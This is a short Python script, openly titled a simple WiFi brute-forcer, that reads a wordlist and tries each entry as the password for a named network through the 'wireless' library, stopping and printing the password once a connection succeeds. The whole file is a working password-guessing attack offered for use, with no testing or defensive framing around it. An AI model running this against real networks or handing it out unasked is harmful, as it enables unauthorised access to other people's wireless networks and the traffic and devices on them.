# A simple Wifi BruteForce
# [?] USAGE: BruteWifi.py <Wifi name (ssid)> <wordlist>

from wireless import Wireless
import sys

RED, REGULAR, GREEN, YELLOW = '\33[31m', '\33[37m', '\33[32m', '\33[33m'

ssid = str(sys.argv[1])
wordlist = str(sys.argv[2])

wire = Wireless()

with open(wordlist, 'r') as f:
    print(f"{GREEN} Brute force Started")
    for line in f.readlines():
        if wire.connect(ssid=ssid, password=line.strip()) == True:
            print(f"[+] Successfully connected: {GREEN}{line.strip()}")
            exit(0)
    print(f"{RED}[-] Password not Found")
    
